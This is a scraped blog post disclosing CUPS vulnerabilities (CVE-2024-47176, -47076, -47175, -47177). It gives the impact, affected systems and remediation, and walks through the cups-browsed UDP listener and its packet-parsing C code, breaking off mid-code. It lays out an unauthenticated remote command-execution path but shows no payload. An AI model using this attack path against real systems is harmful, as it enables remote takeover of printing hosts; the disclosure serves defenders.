{
  "Source": "www.evilsocket.net",
  "Title": "Attacking UNIX Systems via CUPS, Part I",
  "Link": "https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/",
  "Content": "\u003cdiv class=\"content\" itemprop=\"articleBody\"\u003e\n      \u003cp\u003eHello friends, this is the first of two, possibly three (if and when I have time to finish the Windows research) writeups. We will start with targeting GNU/Linux systems with an RCE. As someone who’s directly involved in the CUPS project said:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eFrom a generic security point of view, a whole Linux system as it is nowadays is just an endless and hopeless mess of security holes waiting to be exploited.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eWell they’re not wrong!\u003c/p\u003e\n\u003cp\u003eWhile this is \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://www.huawei.com/en/psirt/security-advisories/hw-425408\"\u003enot\u003c/a\u003e the \u003ca href=\"https://www.evilsocket.net/2016/08/24/RCE-against-every-open-source-BTS/\"\u003efirst\u003c/a\u003e time \u003ca href=\"https://www.evilsocket.net/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/\"\u003eI try\u003c/a\u003e to more or less responsibly report a vulnerability, it is definitely the weirdest and most frustrating time as some of you might have noticed from my socials, and it is also the last time. More on this later, but first.\u003c/p\u003e\n\u003ch2 id=\"Summary\"\u003e\u003ca href=\"#Summary\" class=\"headerlink\" title=\"Summary\"\u003e\u003c/a\u003eSummary\u003c/h2\u003e\u003cul\u003e\n\u003cli\u003eCVE-2024-47176 | \u003cstrong\u003ecups-browsed\u003c/strong\u003e \u0026lt;= 2.0.1 binds on UDP INADDR_ANY:631 trusting any packet from any source to trigger a \u003ccode\u003eGet-Printer-Attributes\u003c/code\u003e IPP request to an attacker controlled URL.\u003c/li\u003e\n\u003cli\u003eCVE-2024-47076 | \u003cstrong\u003elibcupsfilters\u003c/strong\u003e \u0026lt;= 2.1b1 \u003ccode\u003ecfGetPrinterAttributes5\u003c/code\u003e does not validate or sanitize the IPP attributes returned from an IPP server, providing attacker controlled data to the rest of the CUPS system.\u003c/li\u003e\n\u003cli\u003eCVE-2024-47175 | \u003cstrong\u003elibppd\u003c/strong\u003e \u0026lt;= 2.1b1 \u003ccode\u003eppdCreatePPDFromIPP2\u003c/code\u003e does not validate or sanitize the IPP attributes when writing them to a temporary PPD file, allowing the injection of attacker controlled data in the resulting PPD.\u003c/li\u003e\n\u003cli\u003eCVE-2024-47177 | \u003cstrong\u003ecups-filters\u003c/strong\u003e \u0026lt;= 2.0.1 \u003ccode\u003efoomatic-rip\u003c/code\u003e allows arbitrary command execution via the \u003ccode\u003eFoomaticRIPCommandLine\u003c/code\u003e PPD parameter.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e(can you already see where this is going? :D)\u003c/p\u003e\n\u003cp\u003ePlus a couple of other bugs that will be mentioned and that are arguably security issues but have been pretty much ignored during the conversation with the developers and the CERT. They are still there, along with several other bugs that are more or less exploitable.\u003c/p\u003e\n\u003ch3 id=\"Impact\"\u003e\u003ca href=\"#Impact\" class=\"headerlink\" title=\"Impact\"\u003e\u003c/a\u003eImpact\u003c/h3\u003e\u003cp\u003eA remote unauthenticated attacker can silently replace existing printers’ (or install new ones) IPP urls with a malicious one, resulting in arbitrary command execution (on the computer) when a print job is started (from that computer).\u003c/p\u003e\n\u003ch3 id=\"Entry-Points\"\u003e\u003ca href=\"#Entry-Points\" class=\"headerlink\" title=\"Entry Points\"\u003e\u003c/a\u003eEntry Points\u003c/h3\u003e\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eWAN / public internet\u003c/strong\u003e: a remote attacker sends an \u003cstrong\u003eUDP\u003c/strong\u003e packet to port \u003cstrong\u003e631\u003c/strong\u003e. No authentication whatsoever.\u003c/li\u003e\n\u003cli\u003eLAN: a local attacker can spoof zeroconf / mDNS / DNS-SD advertisements (we will talk more about this in the next writeup ) and achieve the same code path leading to RCE.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eQuoting one of the first comments from the guy who literally wrote the book about CUPS, while trying to explain to me why this is not that bad:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eI am just pointing out that the public Internet attack is limited to servers that are directly connected to the Internet\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/images/2024/cups1/smart.jpg\" alt=\"smart\"/\u003e\u003c/p\u003e\n\u003ch3 id=\"Affected-Systems\"\u003e\u003ca href=\"#Affected-Systems\" class=\"headerlink\" title=\"Affected Systems\"\u003e\u003c/a\u003eAffected Systems\u003c/h3\u003e\u003cp\u003eCUPS and specifically cups-browsed are packaged for most UNIX systems:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003emost \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://pkgs.org/download/cups-browsed\"\u003eGNU/Linux distributions\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" rel=\"noopener\" href=\"https://docs.freebsd.org/en/articles/cups/\"\u003esome\u003c/a\u003e BSDs.\u003c/li\u003e\n\u003cli\u003eGoogle \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://source.chromium.org/chromiumos/chromiumos/codesearch/+/main:src/third_party/chromiumos-overlay/net-print/;bpv=1\"\u003eChromium / ChromeOS\u003c/a\u003e … \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://issuetracker.google.com/issues/172222838\"\u003emaybe?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eOracle \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://docs.oracle.com/cd/E23824_01/html/821-1451/cups-intro.html\"\u003eSolaris\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003ePossibly more?\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThis thing is packaged for anything, in some cases it’s enabled by default, in others it’s not, go figure 🤷. Full disclosure, I’ve been scanning the entire public internet IPv4 ranges several times a day for weeks, sending the UDP packet and logging whatever connected back. And I’ve got back connections from \u003cstrong\u003ehundreds of thousands\u003c/strong\u003e of devices, with \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://x.com/evilsocket/status/1833878573289025664\"\u003epeaks of 200-300K concurrent clients\u003c/a\u003e. \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://pastebin.com/7zzFzxCN\"\u003eThis file\u003c/a\u003e contains a list of the unique Linux systems affected. Note that everything that is not Linux has been filtered out. That is why I was getting increasingly alarmed during the last few weeks.\u003c/p\u003e\n\u003ch3 id=\"Remediation\"\u003e\u003ca href=\"#Remediation\" class=\"headerlink\" title=\"Remediation\"\u003e\u003c/a\u003eRemediation\u003c/h3\u003e\u003cul\u003e\n\u003cli\u003eDisable and remove the \u003ccode\u003ecups-browsed\u003c/code\u003e service if you don’t need it (and probably you don’t).\u003c/li\u003e\n\u003cli\u003eUpdate the CUPS package on your systems. \u003c/li\u003e\n\u003cli\u003eIn case your system can’t be updated and for some reason you rely on this service, block all traffic to UDP port 631 and possibly all DNS-SD traffic (good luck if you use zeroconf).\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eEntirely personal recommendation, take it or leave it:\u003c/strong\u003e I’ve seen and attacked enough of this codebase to remove any CUPS service, binary and library from any of my systems and never again use a UNIX system to print. I’m also removing every zeroconf / avahi / bonjour listener. You might consider doing the same.\u003c/p\u003e\n\u003ch2 id=\"Intro\"\u003e\u003ca href=\"#Intro\" class=\"headerlink\" title=\"Intro\"\u003e\u003c/a\u003eIntro\u003c/h2\u003e\u003cp\u003eOne lazy day a few weeks ago, I was configuring Ubuntu on a new laptop (GPD Pocket 3, amazing little hacking machine btw) and for reasons that are irrelevant to this post I wanted to check which services were listening on UDP ports - so I type \u003ccode\u003enetstat -anu\u003c/code\u003e in a terminal and after checking the output, I notice something interesting:\u003c/p\u003e\n\u003cfigure class=\"highlight plain\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003eProto Recv-Q Send-Q Local Address           Foreign Address         State \u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eudp        0      0 0.0.0.0:631             0.0.0.0:*\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e...\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eThe \u003ccode\u003e0.0.0.0\u003c/code\u003e part is especially unusual, it means that whatever process is listening on port 631, it is listening on and responding to any network interface: LAN, WAN, VPN, whatever you have. I also vaguely recalled that \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://en.wikipedia.org/wiki/CUPS\"\u003eCUPS, the Common Unix Printing System\u003c/a\u003e, uses TCP port 631, but this is UDP. I investigated with a \u003ccode\u003elsof -i :631\u003c/code\u003e, that confirmed CUPS on 631 tcp plus this other process, \u003ccode\u003ecups-browsed\u003c/code\u003e (likely related to CUPS), using the udp port instead:\u003c/p\u003e\n\u003cfigure class=\"highlight plain\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003ecupsd     1868642 root    6u  IPv6 32034095      0t0  TCP ip6-localhost:ipp (LISTEN)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ecupsd     1868642 root    8u  IPv4 32034096      0t0  TCP localhost:ipp (LISTEN)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ecups-brow 1868652 root    7u  IPv4 32024370      0t0  UDP *:631 \u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eAnd \u003ccode\u003eps aux | grep \u0026#34;cups-brow\u0026#34;\u003c/code\u003e ultimately confirmed that this process runs as root:\u003c/p\u003e\n\u003cfigure class=\"highlight plain\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003eroot     1868652  0.0  0.0 172692 11196 ?        Ssl  13:20   0:00 /usr/sbin/cups-browsed\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003ch2 id=\"What-is-cups-browsed\"\u003e\u003ca href=\"#What-is-cups-browsed\" class=\"headerlink\" title=\"What is cups-browsed?\"\u003e\u003c/a\u003eWhat is cups-browsed?\u003c/h2\u003e\u003cp\u003eAfter some googling I found out that \u003ccode\u003ecups-browsed\u003c/code\u003e is indeed part of the CUPS system and it is responsible for discovering new printers and \u003cstrong\u003eautomatically adding them to the system\u003c/strong\u003e. Very interesting, I had no idea Linux just added anything found on a network before the user can even accept or be notified. The more you know!\u003c/p\u003e\n\u003cp\u003eAt this point I was extremely intrigued and curious, so I start digging into the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed\"\u003esource code of this service\u003c/a\u003e. While it’s pretty messy on one hand, it is also self contained and relatively easy to understand. So I quickly search for \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://man7.org/linux/man-pages/man2/bind.2.html\"\u003ebind API\u003c/a\u003e usage and \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L13995\"\u003econfirm\u003c/a\u003e that this thing is indeed listening on INADDR_ANY:631 UDP:\u003c/p\u003e\n\u003cfigure class=\"highlight c\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"class\"\u003e\u003cspan class=\"keyword\"\u003estruct\u003c/span\u003e \u003cspan class=\"title\"\u003esockaddr_in\u003c/span\u003e \u003cspan class=\"title\"\u003eaddr\u003c/span\u003e;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003ememset\u003c/span\u003e (\u0026amp;addr, \u003cspan class=\"number\"\u003e0\u003c/span\u003e, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e (addr));\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eaddr.sin_addr.s_addr = htonl (INADDR_ANY);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eaddr.sin_family = AF_INET;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eaddr.sin_port = htons (BrowsePort);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (bind (browsesocket, (struct sockaddr *)\u0026amp;addr, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e (addr)))\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    debug_printf(\u003cspan class=\"string\"\u003e\u0026#34;failed to bind CUPS Browsing socket: %s\\n\u0026#34;\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        strerror (errno));\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    close (browsesocket);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    browsesocket = \u003cspan class=\"number\"\u003e-1\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e...\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eCool, this code is using global variables like there’s no tomorrow, so searching for the \u003ccode\u003ebrowsesocket\u003c/code\u003e \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L11819\"\u003erevealed\u003c/a\u003e that the \u003ccode\u003eprocess_browse_data\u003c/code\u003e function is reading a packet from it, performing some checks and then some parsing:\u003c/p\u003e\n\u003cfigure class=\"highlight c\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e17\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e18\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e19\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003egot = recvfrom (browsesocket, packet, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e (packet) - \u003cspan class=\"number\"\u003e1\u003c/span\u003e, \u003cspan class=\"number\"\u003e0\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u0026amp;srcaddr.addr, \u0026amp;srclen);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e// ... error checking removed for brevity ...\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003epacket[got] = \u003cspan class=\"string\"\u003e\u0026#39;\\0\u0026#39;\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ehttpAddrString (\u0026amp;srcaddr, remote_host, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e (remote_host) - \u003cspan class=\"number\"\u003e1\u003c/span\u003e);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e// Check this packet is allowed\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (!allowed ((struct sockaddr *) \u0026amp;srcaddr))\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    debug_printf(\u003cspan class=\"string\"\u003e\u0026#34;browse packet from %s disallowed\\n\u0026#34;\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            remote_host);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e (TRUE);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e// debug loggig removed for brevity\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"built_in\"\u003esscanf\u003c/span\u003e (packet, \u003cspan class=\"string\"\u003e\u0026#34;%x%x%1023s\u0026#34;\u003c/span\u003e, \u0026amp;type, \u0026amp;state, uri) \u0026lt; \u003cspan class=\"number\"\u003e3\u003c/span\u003e)\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eEssentially, this service expects an UDP packet with the format \u003ccode\u003eHEX_NUMBER HEX_NUMBER TEXT_DATA\u003c/code\u003e and, if the \u003ccode\u003eallowed\u003c/code\u003e function returns true for the specific source IP, more things happen later. \u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2024/cups1/right.jpg\" alt=\"right?!\"/\u003e\u003c/p\u003e\n\u003cp\u003eWell it turns out that while you \u003cem\u003ecould\u003c/em\u003e configure who can and who can’t connect by editing the \u003ccode\u003e/etc/cups/cups-browsed.conf\u003c/code\u003e configuration file … the default configuration file, on pretty much any system, is entirely commented out and simply allows anyone.\u003c/p\u003e\n\u003cp\u003eGreat 🤦\u003c/p\u003e\n\u003cp\u003eLater in the code, some \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L11857\"\u003epointer operations are performed to parse the packet\u003c/a\u003e. If all checks pass, two text fields parsed from the packet are passed to the \u003ccode\u003efound_cups_printer\u003c/code\u003e function. We’ll return to this function in a moment, but for now let’s focus on the parsing.\u003c/p\u003e\n\u003ch2 id=\"Stack-Buffer-Overflows-and-Race-Conditions\"\u003e\u003ca href=\"#Stack-Buffer-Overflows-and-Race-Conditions\" class=\"headerlink\" title=\"Stack Buffer Overflows and Race Conditions\"\u003e\u003c/a\u003eStack Buffer Overflows and Race Conditions\u003c/h2\u003e\u003cp\u003eKeep in mind that while the \u003ccode\u003eCUPS\u003c/code\u003e package itself \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/google/oss-fuzz/tree/master/projects/cups\"\u003eis covered in oss-fuzz\u003c/a\u003e (barely to be honest …), \u003cstrong\u003ecups-browsed is not\u003c/strong\u003e; there seems to be no fuzzing coverage for this component. And I don’t know about you, but to me this parsing routine looks fishy and definitely something worth fuzzing:\u003c/p\u003e\n\u003cfigure class=\"highlight c\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e17\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e18\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e19\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e20\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e21\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e22\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e23\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e24\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e25\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e26\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e27\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e28\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e29\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e30\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e31\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e32\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e33\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e34\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e35\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e36\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e37\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e38\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e39\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e40\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e41\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e42\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e43\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e44\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e45\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003eend = packet + \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e(packet);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ec = \u003cspan class=\"built_in\"\u003estrchr\u003c/span\u003e (packet, \u003cspan class=\"string\"\u003e\u0026#39;\\\u0026#34;\u0026#39;\u003c/span\u003e);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (c \u0026gt;= end)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e (TRUE);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (c)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"comment\"\u003e// Extract location field\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    {\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e i;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        c++;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003efor\u003c/span\u003e (i = \u003cspan class=\"number\"\u003e0\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e             i \u0026lt; \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e (location) - \u003cspan class=\"number\"\u003e1\u003c/span\u003e \u0026amp;\u0026amp; *c != \u003cspan class=\"string\"\u003e\u0026#39;\\\u0026#34;\u0026#39;\u003c/span\u003e \u0026amp;\u0026amp; c \u0026lt; end;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e             i++, c++)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                location[i] = *c;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        location[i] = \u003cspan class=\"string\"\u003e\u0026#39;\\0\u0026#39;\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        debug_printf(\u003cspan 